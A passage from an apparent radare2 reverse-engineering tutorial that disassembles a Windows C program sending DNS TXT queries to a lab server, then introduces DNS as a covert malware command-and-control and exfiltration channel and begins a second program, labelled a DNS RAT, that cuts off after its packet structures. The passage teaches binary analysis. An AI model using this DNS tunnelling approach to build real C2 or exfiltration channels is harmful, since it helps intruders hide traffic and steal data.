    if (recvfrom(sock, &buf, BUFLEN, 0,0,0) == SOCKET_ERROR){
        printf("error recving : %d" , WSAGetLastError());

    }else{
        printf("4 - RECVFROM() OK, packet received \n"); // joe.ab.local
        reader = &buf[sizeof(struct dns_header) + (strlen((const char*)qname)+1) + sizeof(struct question)];

        if(dns->ans_count > 0){
            int txt_position = 30 + strlen(host)-1;
            int txt_response_len = buf[txt_position];
            printf("BUF: %d \n",txt_response_len);
            dns = (struct dns_header*) buf;
            // just printing the response packet char by char, we can either do printf()
            for(int i=txt_position+1; i < 1+txt_position+txt_response_len; i++){
                printf("%c",buf[i]);
            }
            printf("\n");
        }
    }
    WSACleanup();
    printf("WSACLEANUP() OK exiting \n");
    return 0;
}
```

Now to the disasm:
```
[0x00401634]> pdf
/ (fcn) sym.main 1203
|   sym.main (int arg_180h, int arg_1f0h, int arg_101f0h, int arg_101f4h, int arg_101f8h, int arg_10200h, int arg_10208h, int arg_1020ch, int arg_10210h, int arg_10218h, int arg_10220h, int arg_1022ch, int arg_20h, int arg_28h, int arg_80h);
|           ; arg int arg_20h @ rsp+0x20
|           ; arg int arg_28h @ rsp+0x28
|           ; arg int arg_80h @ rsp+0x80
|           ; CALL XREF from 0x004013c2 (sym.__tmainCRTStartup)
|           0x00401634      55             push rbp
|           0x00401635      b8b0020100     mov eax, 0x102b0
|           0x0040163a      e871190000     call fcn.00402fb0
|           0x0040163f      4829c4         sub rsp, rax
|           0x00401642      488dac248000.  lea rbp, [arg_80h]          ; 0x80 ; 128
|           0x0040164a      e891050000     call sym.__main
|           0x0040164f      488d0daa3900.  lea rcx, str.DNS_RAT_UP_AND_RUNNING ; section..rdata ; 0x405000 ; "DNS RAT UP AND RUNNING "
|           0x00401656      e8bd190000     call sym.puts               ; int puts(const char *s)
|           0x0040165b      488d0db63900.  lea rcx, str.Enter_Hostname_to_Lookup_: ; 0x405018 ; "Enter Hostname to Lookup : "
|           0x00401662      e8c1190000     call sym.printf             ; int printf(const char *format)
|           0x00401667      488d85800100.  lea rax, [arg_180h]         ; 0x180 ; 384
|           0x0040166e      4889c2         mov rdx, rax
|           0x00401671      488d0dbc3900.  lea rcx, [0x00405034]       ; "%s"
|           0x00401678      e893190000     call sym.scanf              ; int scanf(const char *format)
|           0x0040167d      48c785200201.  mov qword [arg_10220h], 0   ; [0x10220:8]=0
|           0x00401688      48c785180201.  mov qword [arg_10218h], 0   ; [0x10218:8]=0
|           0x00401693      488d85f00100.  lea rax, [arg_1f0h]         ; 0x1f0 ; 496
|           0x0040169a      488985180201.  mov qword [arg_10218h], rax ; [0x10218:8]=0
|           0x004016a1      e8da190000     call sym.getpid             ; int getpid(void)
|           0x004016a6      0fb7c0         movzx eax, ax
|           0x004016a9      89c1           mov ecx, eax
|           0x004016ab      488b056e7d00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409420:8]=0x97c2 reloc.WS2_32.dll_htons
|           0x004016b2      ffd0           call rax
|           0x004016b4      89c2           mov edx, eax
|           0x004016b6      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x004016bd      668910         mov word [rax], dx
|           0x004016c0      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x004016c7      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|           0x004016cb      83e27f         and edx, 0x7f
|           0x004016ce      885002         mov byte [rax + 2], dl
|           0x004016d1      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x004016d8      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|           0x004016dc      83e287         and edx, 0xffffff87
|           0x004016df      885002         mov byte [rax + 2], dl
|           0x004016e2      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x004016e9      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|           0x004016ed      83e2fb         and edx, 0xfffffffb
|           0x004016f0      885002         mov byte [rax + 2], dl
|           0x004016f3      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x004016fa      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|           0x004016fe      83e2fd         and edx, 0xfffffffd
|           0x00401701      885002         mov byte [rax + 2], dl
|           0x00401704      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x0040170b      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|           0x0040170f      83ca01         or edx, 1
|           0x00401712      885002         mov byte [rax + 2], dl
|           0x00401715      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x0040171c      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|           0x00401720      83e27f         and edx, 0x7f
|           0x00401723      885003         mov byte [rax + 3], dl
|           0x00401726      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x0040172d      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|           0x00401731      83e2bf         and edx, 0xffffffbf
|           0x00401734      885003         mov byte [rax + 3], dl
|           0x00401737      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x0040173e      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|           0x00401742      83e2df         and edx, 0xffffffdf
|           0x00401745      885003         mov byte [rax + 3], dl
|           0x00401748      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x0040174f      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|           0x00401753      83e2ef         and edx, 0xffffffef
|           0x00401756      885003         mov byte [rax + 3], dl
|           0x00401759      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x00401760      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|           0x00401764      83e2f0         and edx, 0xfffffff0
|           0x00401767      885003         mov byte [rax + 3], dl
|           0x0040176a      b901000000     mov ecx, 1
|           0x0040176f      488b05aa7c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409420:8]=0x97c2 reloc.WS2_32.dll_htons
|           0x00401776      ffd0           call rax
|           0x00401778      89c2           mov edx, eax
|           0x0040177a      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x00401781      66895004       mov word [rax + 4], dx
|           0x00401785      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x0040178c      66c740060000   mov word [rax + 6], 0
|           0x00401792      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x00401799      66c740080000   mov word [rax + 8], 0
|           0x0040179f      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x004017a6      66c7400a0000   mov word [rax + 0xa], 0
|           0x004017ac      488d85f00100.  lea rax, [arg_1f0h]         ; 0x1f0 ; 496
|           0x004017b3      4883c00c       add rax, 0xc
|           0x004017b7      488985100201.  mov qword [arg_10210h], rax ; [0x10210:8]=0
|           0x004017be      488d85800100.  lea rax, [arg_180h]         ; 0x180 ; 384
|           0x004017c5      488b8d100201.  mov rcx, qword [arg_10210h] ; [0x10210:8]=0
|           0x004017cc      4889c2         mov rdx, rax
|           0x004017cf      e87cfdffff     call sym.ChangetoDnsNameFormat
|           0x004017d4      488b85100201.  mov rax, qword [arg_10210h] ; [0x10210:8]=0
|           0x004017db      4889c1         mov rcx, rax
|           0x004017de      e81d180000     call sym.strlen             ; size_t strlen(const char *s)
|           0x004017e3      488d500d       lea rdx, [rax + 0xd]        ; 13
|           0x004017e7      488d85f00100.  lea rax, [arg_1f0h]         ; 0x1f0 ; 496
|           0x004017ee      4801d0         add rax, rdx                ; '('
|           0x004017f1      488985200201.  mov qword [arg_10220h], rax ; [0x10220:8]=0
|           0x004017f8      b910000000     mov ecx, 0x10               ; 16
|           0x004017fd      488b051c7c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409420:8]=0x97c2 reloc.WS2_32.dll_htons
|           0x00401804      ffd0           call rax
|           0x00401806      89c2           mov edx, eax
|           0x00401808      488b85200201.  mov rax, qword [arg_10220h] ; [0x10220:8]=0
|           0x0040180f      668910         mov word [rax], dx
|           0x00401812      b901000000     mov ecx, 1
|           0x00401817      488b05027c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409420:8]=0x97c2 reloc.WS2_32.dll_htons
|           0x0040181e      ffd0           call rax
|           0x00401820      89c2           mov edx, eax
|           0x00401822      488b85200201.  mov rax, qword [arg_10220h] ; [0x10220:8]=0
|           0x00401829      66895002       mov word [rax + 2], dx
|           0x0040182d      c7850c020100.  mov dword [arg_1020ch], 0x10 ; 16
|           0x00401837      c78508020100.  mov dword [arg_10208h], 0x35 ; '5' ; 53
|           0x00401841      488d45e0       lea rax, [local_20h]
|           0x00401845      4889c2         mov rdx, rax
|           0x00401848      b902020000     mov ecx, 0x202              ; 514
|           0x0040184d      488b05c47b00.  mov rax, qword sym.imp.WS2_32.dll_WSAStartup ; [0x409418:8]=0x97b4 reloc.WS2_32.dll_WSAStartup
|           0x00401854      ffd0           call rax
|           0x00401856      85c0           test eax, eax
|       ,=< 0x00401858      7421           je 0x40187b
|       |   0x0040185a      488b05af7b00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x409410:8]=0x97a2 reloc.WS2_32.dll_WSAGetLastError
|       |   0x00401861      ffd0           call rax
|       |   0x00401863      89c2           mov edx, eax
|       |   0x00401865      488d0dcb3700.  lea rcx, str.Failed._Error_Code_:__d ; 0x405037 ; "Failed. Error Code : %d"
|       |   0x0040186c      e8b7170000     call sym.printf             ; int printf(const char *format)
|       |   0x00401871      b801000000     mov eax, 1
|      ,==< 0x00401876      e963020000     jmp 0x401ade
|      ||   ; CODE XREF from 0x00401858 (sym.main)
|      |`-> 0x0040187b      488d0dcd3700.  lea rcx, str.1___WINSOCK_INITIALIZED. ; 0x40504f ; "1 - WINSOCK INITIALIZED. "
|      |    0x00401882      e891170000     call sym.puts               ; int puts(const char *s)
|      |    0x00401887      41b811000000   mov r8d, 0x11               ; 17
|      |    0x0040188d      ba02000000     mov edx, 2
|      |    0x00401892      b902000000     mov ecx, 2
|      |    0x00401897      488b05a27b00.  mov rax, qword sym.imp.WS2_32.dll_socket ; [0x409440:8]=0x97ec reloc.WS2_32.dll_socket
|      |    0x0040189e      ffd0           call rax
|      |    0x004018a0      488985000201.  mov qword [arg_10200h], rax ; [0x10200:8]=0
|      |    0x004018a7      4883bd000201.  cmp qword [arg_10200h], 0xffffffffffffffff
|      |,=< 0x004018af      7517           jne 0x4018c8
|      ||   0x004018b1      488b05587b00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x409410:8]=0x97a2 reloc.WS2_32.dll_WSAGetLastError
|      ||   0x004018b8      ffd0           call rax
|      ||   0x004018ba      89c2           mov edx, eax
|      ||   0x004018bc      488d0da63700.  lea rcx, str.Could_not_create_socket_:__d ; 0x405069 ; "Could not create socket : %d"
|      ||   0x004018c3      e860170000     call sym.printf             ; int printf(const char *format)
|      ||   ; CODE XREF from 0x004018af (sym.main)
|      |`-> 0x004018c8      488d0db73700.  lea rcx, str.2___WINSOCK_SOCKET_CREATED. ; 0x405086 ; "2 - WINSOCK SOCKET CREATED. "
|      |    0x004018cf      e844170000     call sym.puts               ; int puts(const char *s)
|      |    0x004018d4      66c745d00200   mov word [local_30h], 2
|      |    0x004018da      8b8508020100   mov eax, dword [arg_10208h] ; [0x10208:4]=0
|      |    0x004018e0      0fb7c0         movzx eax, ax
|      |    0x004018e3      89c1           mov ecx, eax
|      |    0x004018e5      488b05347b00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409420:8]=0x97c2 reloc.WS2_32.dll_htons
|      |    0x004018ec      ffd0           call rax
|      |    0x004018ee      668945d2       mov word [local_2eh], ax
|      |    0x004018f2      488d0daa3700.  lea rcx, str.192.168.0.50   ; 0x4050a3 ; "192.168.0.50"
|      |    0x004018f9      488b05287b00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x409428:8]=0x97ca reloc.WS2_32.dll_inet_addr
|      |    0x00401900      ffd0           call rax
|      |    0x00401902      8945d4         mov dword [local_2ch], eax
|      |    0x00401905      488b85100201.  mov rax, qword [arg_10210h] ; [0x10210:8]=0
|      |    0x0040190c      4889c1         mov rcx, rax
|      |    0x0040190f      e8ec160000     call sym.strlen             ; size_t strlen(const char *s)
|      |    0x00401914      83c011         add eax, 0x11
|      |    0x00401917      4189c0         mov r8d, eax
|      |    0x0040191a      488d85f00100.  lea rax, [arg_1f0h]         ; 0x1f0 ; 496
|      |    0x00401921      488b8d000201.  mov rcx, qword [arg_10200h] ; [0x10200:8]=0
|      |    0x00401928      8b950c020100   mov edx, dword [arg_1020ch] ; [0x1020c:4]=0
|      |    0x0040192e      89542428       mov dword [arg_28h], edx
|      |    0x00401932      488d55d0       lea rdx, [local_30h]
|      |    0x00401936      4889542420     mov qword [arg_20h], rdx
|      |    0x0040193b      41b900000000   mov r9d, 0
|      |    0x00401941      4889c2         mov rdx, rax
|      |    0x00401944      488b05ed7a00.  mov rax, qword sym.imp.WS2_32.dll_sendto ; [0x409438:8]=0x97e2 reloc.WS2_32.dll_sendto
|      |    0x0040194b      ffd0           call rax
|      |    0x0040194d      83f8ff         cmp eax, 0xffffffffffffffff
|      |,=< 0x00401950      7521           jne 0x401973
|      ||   0x00401952      488b05b77a00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x409410:8]=0x97a2 reloc.WS2_32.dll_WSAGetLastError
|      ||   0x00401959      ffd0           call rax
|      ||   0x0040195b      89c2           mov edx, eax
|      ||   0x0040195d      488d0d4c3700.  lea rcx, str.sendto___failed_with_error_code_:__d ; 0x4050b0 ; "sendto() failed with error code : %d "
|      ||   0x00401964      e8bf160000     call sym.printf             ; int printf(const char *format)
|      ||   0x00401969      b901000000     mov ecx, 1
|      ||   0x0040196e      e8e5160000     call sym.exit
|      ||   ; CODE XREF from 0x00401950 (sym.main)
|      |`-> 0x00401973      488d0d5c3700.  lea rcx, str.3___SENDTO___OK__packet_sent ; 0x4050d6 ; "3 - SENDTO() OK, packet sent"
|      |    0x0040197a      e899160000     call sym.puts               ; int puts(const char *s)
|      |    0x0040197f      488d85f00100.  lea rax, [arg_1f0h]         ; 0x1f0 ; 496
|      |    0x00401986      488b8d000201.  mov rcx, qword [arg_10200h] ; [0x10200:8]=0
|      |    0x0040198d      48c744242800.  mov qword [arg_28h], 0
|      |    0x00401996      48c744242000.  mov qword [arg_20h], 0
|      |    0x0040199f      41b900000000   mov r9d, 0
|      |    0x004019a5      41b800000100   mov r8d, 0x10000
|      |    0x004019ab      4889c2         mov rdx, rax
|      |    0x004019ae      488b057b7a00.  mov rax, qword sym.imp.WS2_32.dll_recvfrom ; [0x409430:8]=0x97d6 reloc.WS2_32.dll_recvfrom
|      |    0x004019b5      ffd0           call rax
|      |    0x004019b7      83f8ff         cmp eax, 0xffffffffffffffff
|      |,=< 0x004019ba      751c           jne 0x4019d8
|      ||   0x004019bc      488b054d7a00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x409410:8]=0x97a2 reloc.WS2_32.dll_WSAGetLastError
|      ||   0x004019c3      ffd0           call rax
|      ||   0x004019c5      89c2           mov edx, eax
|      ||   0x004019c7      488d0d253700.  lea rcx, str.error_recving_:__d ; 0x4050f3 ; "error recving : %d"
|      ||   0x004019ce      e855160000     call sym.printf             ; int printf(const char *format)
|     ,===< 0x004019d3      e9ec000000     jmp 0x401ac4
|     |||   ; CODE XREF from 0x004019ba (sym.main)
|     ||`-> 0x004019d8      488d0d293700.  lea rcx, str.4___RECVFROM___OK__packet_received ; 0x405108 ; "4 - RECVFROM() OK, packet received "
|     ||    0x004019df      e834160000     call sym.puts               ; int puts(const char *s)
|     ||    0x004019e4      488b85100201.  mov rax, qword [arg_10210h] ; [0x10210:8]=0
|     ||    0x004019eb      4889c1         mov rcx, rax
|     ||    0x004019ee      e80d160000     call sym.strlen             ; size_t strlen(const char *s)
|     ||    0x004019f3      488d5011       lea rdx, [rax + 0x11]       ; 17
|     ||    0x004019f7      488d85f00100.  lea rax, [arg_1f0h]         ; 0x1f0 ; 496
|     ||    0x004019fe      4801d0         add rax, rdx                ; '('
|     ||    0x00401a01      488985f80101.  mov qword [arg_101f8h], rax ; [0x101f8:8]=0
|     ||    0x00401a08      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|     ||    0x00401a0f      0fb74006       movzx eax, word [rax + 6]   ; [0x6:2]=0xffff ; 6
|     ||    0x00401a13      6685c0         test ax, ax
|     ||,=< 0x00401a16      0f84a8000000   je 0x401ac4
|     |||   0x00401a1c      488d85800100.  lea rax, [arg_180h]         ; 0x180 ; 384
|     |||   0x00401a23      4889c1         mov rcx, rax
|     |||   0x00401a26      e8d5150000     call sym.strlen             ; size_t strlen(const char *s)
|     |||   0x00401a2b      83c01d         add eax, 0x1d
|     |||   0x00401a2e      8985f4010100   mov dword [arg_101f4h], eax ; [0x101f4:4]=0
|     |||   0x00401a34      8b85f4010100   mov eax, dword [arg_101f4h] ; [0x101f4:4]=0
|     |||   0x00401a3a      4898           cdqe
|     |||   0x00401a3c      0fb68405f001.  movzx eax, byte [rbp + rax + 0x1f0] ; [0x1f0:1]=255 ; 496
|     |||   0x00401a44      0fb6c0         movzx eax, al
|     |||   0x00401a47      8985f0010100   mov dword [arg_101f0h], eax ; [0x101f0:4]=0
|     |||   0x00401a4d      8b85f0010100   mov eax, dword [arg_101f0h] ; [0x101f0:4]=0
|     |||   0x00401a53      89c2           mov edx, eax
|     |||   0x00401a55      488d0dd03600.  lea rcx, str.BUF:__d        ; 0x40512c ; "BUF: %d \n"
|     |||   0x00401a5c      e8c7150000     call sym.printf             ; int printf(const char *format)
|     |||   0x00401a61      488d85f00100.  lea rax, [arg_1f0h]         ; 0x1f0 ; 496
|     |||   0x00401a68      488985180201.  mov qword [arg_10218h], rax ; [0x10218:8]=0
|     |||   0x00401a6f      8b85f4010100   mov eax, dword [arg_101f4h] ; [0x101f4:4]=0
|     |||   0x00401a75      83c001         add eax, 1
|     |||   0x00401a78      89852c020100   mov dword [arg_1022ch], eax ; [0x1022c:4]=0
|    ,====< 0x00401a7e      eb21           jmp 0x401aa1
|    ||||   ; CODE XREF from 0x00401ab8 (sym.main)
|   .-----> 0x00401a80      8b852c020100   mov eax, dword [arg_1022ch] ; [0x1022c:4]=0
|   :||||   0x00401a86      4898           cdqe
|   :||||   0x00401a88      0fb68405f001.  movzx eax, byte [rbp + rax + 0x1f0] ; [0x1f0:1]=255 ; 496
|   :||||   0x00401a90      0fb6c0         movzx eax, al
|   :||||   0x00401a93      89c1           mov ecx, eax
|   :||||   0x00401a95      e886150000     call sym.putchar            ; int putchar(int c)
|   :||||   0x00401a9a      83852c020100.  add dword [arg_1022ch], 1
|   :||||   ; CODE XREF from 0x00401a7e (sym.main)
|   :`----> 0x00401aa1      8b85f4010100   mov eax, dword [arg_101f4h] ; [0x101f4:4]=0
|   : |||   0x00401aa7      8d5001         lea edx, [rax + 1]          ; 1
|   : |||   0x00401aaa      8b85f0010100   mov eax, dword [arg_101f0h] ; [0x101f0:4]=0
|   : |||   0x00401ab0      01d0           add eax, edx
|   : |||   0x00401ab2      39852c020100   cmp dword [arg_1022ch], eax ; [0x13:4]=-1 ; 19
|   `=====< 0x00401ab8      7cc6           jl 0x401a80
|     |||   0x00401aba      b90a000000     mov ecx, 0xa
|     |||   0x00401abf      e85c150000     call sym.putchar            ; int putchar(int c)
|     |||   ; CODE XREF from 0x004019d3 (sym.main)
|     |||   ; CODE XREF from 0x00401a16 (sym.main)
|     `-`-> 0x00401ac4      488b053d7900.  mov rax, qword sym.imp.WS2_32.dll_WSACleanup ; [0x409408:8]=0x9794 reloc.WS2_32.dll_WSACleanup
|      |    0x00401acb      ffd0           call rax
|      |    0x00401acd      488d0d623600.  lea rcx, str.WSACLEANUP___OK_exiting ; 0x405136 ; "WSACLEANUP() OK exiting "
|      |    0x00401ad4      e83f150000     call sym.puts               ; int puts(const char *s)
|      |    0x00401ad9      b800000000     mov eax, 0
|      |    ; CODE XREF from 0x00401876 (sym.main)
|      `--> 0x00401ade      4881c4b00201.  add rsp, 0x102b0
|           0x00401ae5      5d             pop rbp
\           0x00401ae6      c3             ret
[0x00401634]>                                                        
```
As you can see here, progams start to get huge and kind of *unreadable* when you have bigger progams like this one, that start to look like "real world projects" instead of just simple examples you definetely cannot go line by line trying to figure everything out as it will take ages to do and may also be very complex as when progams start to fork their workflow things get mega complex.

One interesting approach in scenarios like that is to inspect function calls, an initial overview on function calls will get you a general idea on the progam, breakpoints before and after func. calls will let you know what is actually going on on the program. 

In case of doubt we can  go and analyze the context of those calls and that's it.

So let's begin here:

We start by seeing how the program initializes a lot of data, on some particular memory block:

```
|           0x004016b2      ffd0           call rax
|           0x004016b4      89c2           mov edx, eax
|           0x004016b6      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x004016bd      668910         mov word [rax], dx
|           0x004016c0      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x004016c7      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|           0x004016cb      83e27f         and edx, 0x7f
|           0x004016ce      885002         mov byte [rax + 2], dl
|           0x004016d1      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x004016d8      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|           0x004016dc      83e287         and edx, 0xffffff87
|           0x004016df      885002         mov byte [rax + 2], dl
|           0x004016e2      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x004016e9      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|           0x004016ed      83e2fb         and edx, 0xfffffffb
|           0x004016f0      885002         mov byte [rax + 2], dl
|           0x004016f3      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x004016fa      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|           0x004016fe      83e2fd         and edx, 0xfffffffd
|           0x00401701      885002         mov byte [rax + 2], dl
|           0x00401704      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x0040170b      0fb65002       movzx edx, byte [rax + 2]   ; [0x2:1]=255 ; 2
|           0x0040170f      83ca01         or edx, 1
|           0x00401712      885002         mov byte [rax + 2], dl
|           0x00401715      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x0040171c      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|           0x00401720      83e27f         and edx, 0x7f
|           0x00401723      885003         mov byte [rax + 3], dl
|           0x00401726      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x0040172d      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|           0x00401731      83e2bf         and edx, 0xffffffbf
|           0x00401734      885003         mov byte [rax + 3], dl
|           0x00401737      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x0040173e      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|           0x00401742      83e2df         and edx, 0xffffffdf
|           0x00401745      885003         mov byte [rax + 3], dl
|           0x00401748      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x0040174f      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|           0x00401753      83e2ef         and edx, 0xffffffef
|           0x00401756      885003         mov byte [rax + 3], dl
|           0x00401759      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x00401760      0fb65003       movzx edx, byte [rax + 3]   ; [0x3:1]=255 ; 3
|           0x00401764      83e2f0         and edx, 0xfffffff0
```
We don't need to go line by line here to see that an array or a struct is being initialized here, as we see rax+2 and rax+3 alltogether we can guess it is more like a struct than an array

Then we see htons being called and more values added:
```
|           0x0040176f      488b05aa7c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409420:8]=0x97c2 reloc.WS2_32.dll_htons
|           0x00401776      ffd0           call rax
|           0x00401778      89c2           mov edx, eax
|           0x0040177a      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x00401781      66895004       mov word [rax + 4], dx
|           0x00401785      488b85180201.  mov rax, qword [arg_10218h] ; [0x10218:8]=0
|           0x0040178c      66c740060000   mov word [rax + 6], 0
```
On this point we can actually guess that this struct somehow relates to some network data, and as this struct is large (compared to sockaddr for example) we can _deduce_ that this _may_ be a network packet 

Then we see this being called:
```
|           0x004017c5      488b8d100201.  mov rcx, qword [arg_10210h] ; [0x10210:8]=0
|           0x004017cc      4889c2         mov rdx, rax
|           0x004017cf      e87cfdffff     call sym.ChangetoDnsNameFormat
|           0x004017d4      488b85100201.  mov rax, qword [arg_10210h] ; [0x10210:8]=0
|           0x004017db      4889c1         mov rcx, rax
|           0x004017de      e81d180000     call sym.strlen             ; size_t strlen(const char *s)
|           0x004017e3      488d500d       lea rdx, [rax + 0xd]        ; 13
|           0x004017e7      488d85f00100.  lea rax, [arg_1f0h]         ; 0x1f0 ; 496
|           0x004017ee      4801d0         add rax, rdx                ; '('
|           0x004017f1      488985200201.  mov qword [arg_10220h], rax ; [0x10220:8]=0
```
ChangetoDnsNameFormat, thing is pretty clear at this point that must be a DNS query.

The call to htons and right after the definition of 53 (the dns port) confirm our guess
```
|           0x00401817      488b05027c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409420:8]=0x97c2 reloc.WS2_32.dll_htons
|           0x0040181e      ffd0           call rax
|           0x00401820      89c2           mov edx, eax
|           0x00401822      488b85200201.  mov rax, qword [arg_10220h] ; [0x10220:8]=0
|           0x00401829      66895002       mov word [rax + 2], dx
|           0x0040182d      c7850c020100.  mov dword [arg_1020ch], 0x10 ; 16
|           0x00401837      c78508020100.  mov dword [arg_10208h], 0x35 ; '5' ; 53
```
Then, nothing new, WSAStartup is called socket is created and then sendto:

```
|      |    0x00401936      4889542420     mov qword [arg_20h], rdx
|      |    0x0040193b      41b900000000   mov r9d, 0
|      |    0x00401941      4889c2         mov rdx, rax
|      |    0x00401944      488b05ed7a00.  mov rax, qword sym.imp.WS2_32.dll_sendto ; [0x409438:8]=0x97e2 reloc.WS2_32.dll_sendto
|      |    0x0040194b      ffd0           call rax
|      |    0x0040194d      83f8ff         cmp eax, 0xffffffffffffffff
|      |,=< 0x00401950      7521           jne 0x401973
```
That is a good place to set a breakpoint at, so we can see what is being sent

And here it is:
```
[0x00401944]> px @ 0x0060fde0
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0060fde0  1fb4 0100 0001 0000 0000 0000 036a 6f65  .............joe
0x0060fdf0  0261 6205 6c6f 6361 6c00 0010 0001 0000  .ab.local.......
```
We should see the same exact thing in wireshark:

![ws1](assets/images/radare2/wspacket.png)

So this looks like a TXT request for joe.ab.local, pretty legitimate, nothing weird here, let us now look at the response:

```
|      |    0x004019ab      4889c2         mov rdx, rax
|      |    0x004019ae      488b057b7a00.  mov rax, qword sym.imp.WS2_32.dll_recvfrom ; [0x409430:8]=0x7ffcc1793010
|      |    0x004019b5      ffd0           call rax
       |    ;-- rip:
|      |    0x004019b7 b    83f8ff         cmp eax, 0xffffffffffffffff
```
So, calling recv, the answer should be in the previously declared buffer:

```
[0x004019b7]> pxw @ 0x0060fde0
0x0060fde0  0x8085b41f 0x01000100 0x01000100 0x656f6a03  .............joe
0x0060fdf0  0x05626102 0x61636f6c 0x1000006c 0x0cc00100  .ab.local.......
0x0060fe00  0x01001000 0x803a0900 0x59141500 0x6320756f  ......:....You c
0x0060fe10  0x70206e61 0x61207475 0x7420796e 0xc0747865  an put any text.
0x0060fe20  0x00020010 0x3a090001 0x070a0080 0x6d697270  .......:....prim
0x0060fe30  0xc0797261 0x004bc010 0x00010001 0x00803a09  ary...K......:..
0x0060fe40  0x00a8c004 0x00000032 0x00000000 0x00000000  ....2...........
```

And that is the response.


As we go further in the progam we should not see anything of interest. So we can consider that our work with the program is done at this point. And our veredict is that, this program asks a user for input and performs a TXT DNS query based on the user input to a remote server on 192.168.0.50 port 53






#### Malware Command & Control systems through DNS 
So as we now know about the DNS packet format, we see that any kind of information can be encoded inside a domain name query / txt response, so this can clearly be used, and it actually is, as a malware cover communication channel for command and contrl or for (slow) file exfiltration.

Let's look at the following program:
```c 
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <conio.h>

#pragma comment(lib, "ws2_32")

#define BUFLEN 65536

// DNS STANDARD QUERY PACKET
struct dns_header
{
    unsigned short id; // identification number

    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag

    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available

    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};

struct question{
    unsigned short type;
    unsigned short tclass;
};

typedef struct
{
    unsigned char *name;
    struct question *ques;
} query;


void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host){
    int lock = 0 , i;
    strcat((char*)host,".");

    for(i = 0 ; i < strlen((char*)host) ; i++)
    {
        if(host[i]=='.')
        {
            *dns++ = i-lock;
            for(;lock<i;lock++)
            {
                *dns++=host[lock];
            }
            lock++; //or lock=i+1;
        }
    }
    *dns++='\0';
}

